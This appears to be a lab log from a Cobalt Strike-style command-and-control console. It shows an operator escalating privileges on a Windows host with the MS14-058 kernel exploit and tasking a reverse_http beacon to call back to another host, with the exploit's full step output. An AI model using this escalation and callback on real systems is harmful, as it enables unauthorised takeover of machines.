02/03 14:48:31 [metadata] 172.17.2.54 <- 172.17.2.54; computer: A-PC; user: a *; pid: 3948; os: Windows; version: 6.1; beacon arch: x86 (x64)
02/03 14:48:35 [input] <neo> elevate ms14-058 test
02/03 14:48:35 [task] Tasked beacon to run windows/beacon_http/reverse_http (172.17.2.56:80) via ms14-058
02/03 14:49:27 [checkin] host called home, sent: 104503 bytes
02/03 14:49:29 [output]
received output:
[*] Getting Windows version...
[*] Solving symbols...
[*] Requesting Kernel loaded modules...
[*] pZwQuerySystemInformation required length 43224
[*] Parsing SYSTEM_INFO...
[*] 146 Kernel modules found
[*] Checking module \SystemRoot\system32\ntoskrnl.exe
[*] Good! nt found as ntoskrnl.exe at 0x03c16000
[*] ntoskrnl.exe loaded in userspace at: 40000000
[*] pPsLookupProcessByProcessId in kernel: 0xFFFFF80003F691FC
[*] pPsReferencePrimaryToken in kernel: 0xFFFFF80003F6C9D0
[*] Registering class...
[*] Creating window...
[*] Allocating null page...
[*] Getting PtiCurrent...
[*] Good! dwThreadInfoPtr 0xFFFFF900C0ECE850
[*] Creating a fake structure at NULL...
[*] Triggering vulnerability...
[!] Executing payload...


02/03 15:10:33 [metadata] 172.17.2.54 <- 172.17.2.54; computer: A-PC; user: a *; pid: 3948; os: Windows; version: 6.1; beacon arch: x86 (x64)
02/03 15:10:29 [checkin] host called home, sent: 8 bytes
02/03 15:10:29 [output]
beacon exit.

